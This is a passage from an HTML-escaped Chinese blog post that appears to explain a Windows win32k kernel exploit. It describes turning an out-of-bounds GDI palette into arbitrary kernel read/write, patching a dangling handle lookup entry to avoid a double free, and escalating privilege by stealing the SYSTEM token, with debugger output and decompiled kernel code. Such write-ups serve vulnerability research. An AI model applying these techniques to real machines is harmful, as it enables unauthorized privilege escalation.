ULONG      ulTime        0x0
HDC        hdcHead       0x0000000000000000
HDEVPPAL   hSelected     0x0000000000000000
ULONG      cRefhpal      0x0
ULONG      cRefRegular   0x0
PTRANSLATE ptransFore    0x0000000000000000
PTRANSLATE ptransCurrent 0x0000000000000000
PTRANSLATE ptransOld     0x0000000000000000
PPALETTE   ppalColor     0xffffa088c5ad5998
PAL_ULONG  apalColor     0x0000000000000000
--------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;有了越界的 palette 之后就很简单了，在重新申请占位块的时候不用加速表而是使用 palette 占位，这样这个越界 palette 后面就会紧跟着放这一个 palette 给我们操作，再通过覆写 apalColorTable 指针就可以获得任意读写的原语。&lt;/p&gt;

&lt;p&gt;这里还有一个小坑，gdi handle 的一个句柄上限是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;win32kbase! gProcessHandleQuota&lt;/code&gt; 当句柄数量大于这个那么对象会创建失败。具体判断的位置在  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;win32kbase! HmgSetOwner&lt;/code&gt; 中，创建 palette 时候调用栈如下：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1: kd&amp;gt; k
 # Child-SP          RetAddr               Call Site
00 ffff8b81`39559a60 ffffa0e0`ce63cdf3     win32kbase!GreSetPaletteOwner+0x1c
01 ffff8b81`39559a90 fffff802`64201f13     win32kfull!NtGdiCreatePaletteInternal+0xe3
02 ffff8b81`39559b00 00007ffa`d38d2504     nt!KiSystemServiceCopyEnd+0x13
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以在创建 manager 和 worker palette 的实际最好是漏洞利用开始前，在漏洞利用开始后会创建大量 gdi 对象导致 manager 和 worker 创建不成功。&lt;/p&gt;

&lt;h1 id=&quot;gdi-handle-manager&quot;&gt;Gdi Handle Manager&lt;/h1&gt;

&lt;p&gt;但是现在在开始提权前，还有另一个问题，就是现在这个 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdc-&amp;gt;dclevel. pufi&lt;/code&gt; 是悬空的，一旦程序结束，内核释放这个东西又会造成 double free，所以我们要把这个字段置 0，或者也可以直接从句柄表中清除这个对象。那么现在的问题就变成了如果根据 hdc 句柄找到 dc object。&lt;/p&gt;

&lt;p&gt;研究了一下 NtGdiSetLinkedUFIs 的流程可以看到内核通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HmgLock&lt;/code&gt; 函数将句柄转换为对象，该函数讲句柄转换为 index 作为索引从 gpentHmgr 中找到 PENTRY，然后再通过 PENTRY 找到原始的对象。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;POBJ&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pobj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POBJ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uiIndex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HmgIfromH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hobj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;PENTRY&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pentry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpentHmgr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uiIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;但这么简洁明了的逻辑早已是不复存在的美好的 xp 时代了，win10 的逻辑比这个复杂得多，pentry 不再能找到 gdi 对象，取而代之的是一个 LOOKUP_ENTRY，这也是本思路的原作者当时没有选用这个方法而是选择将 gdi 对象转换为一个普通对象 (accelerator table) 去防止 double free 的原因。但是沉下心，我们可以的！&lt;/p&gt;

&lt;p&gt;研究一下 dc 对象删除的逻辑，发现如果 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v12 [0]&lt;/code&gt; 为 0 的情况下是不会去做删除 dc 的操作的。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bDeleteDCInternal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HDC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ebx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// esi&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [rsp+20h] [rbp-28h] BYREF&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DCOBJ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DCOBJ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;775&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HmgQueryLock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bDeleteDCInternalWorker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;EngSetLastError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xAAu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;XDCOBJ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vUnlockNoNullSet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserReleaseDC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么这个 v12 到底是什么呢？它本身是一个 xdcobj 对象，通过函数 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;void __fastcall XDCOBJ:: vLock ( #600 *this, HDC hObj)&lt;/code&gt; 进行初始化，函数内部会将一个 PLOOKUP_ENTRY (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v5&lt;/code&gt;) 赋值到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;v12 [0]&lt;/code&gt; 的位置。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;n&quot;&gt;HandleEntryDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gpHandleManager&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;MaxHandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HandleEntryDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaxHandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HandleEntryDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaxHandle&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaxHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaxHandle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFFFE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HandleEntryDirectory&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MaxHandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                       &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;
                       &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
       &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么思路便清晰了：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;获取 win32kbase 基址&lt;/li&gt;
  &lt;li&gt;获取 gpHandleManager 地址&lt;/li&gt;
  &lt;li&gt;根据算法一通计算算出 lookupentry 的位置&lt;/li&gt;
  &lt;li&gt;置 0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;到此为止，现在我们终于有了一个完美的内核任意读写原语。&lt;/p&gt;

&lt;h1 id=&quot;提权&quot;&gt;提权&lt;/h1&gt;

&lt;p&gt;踩了无数坑，终于来到了提权的步骤了。相比于之前的各种阻碍，提权真的是简单了很多，只有三步：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;找到 system 进程的 EPROCESS&lt;/li&gt;
  &lt;li&gt;找到自己进程的 EPROCESS&lt;/li&gt;
  &lt;li&gt;将自己进程的 EPROCESS 的 token 替换为 system 进程的 token&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;system 的 EPROCESS 在内核中是导出的，然后可以通过 activelinkprocess 链表遍历所有进程的 EPROCESS，进而找到自己进程的 EPROCESS，最后简单替换一下 token 就可以了。&lt;/p&gt;

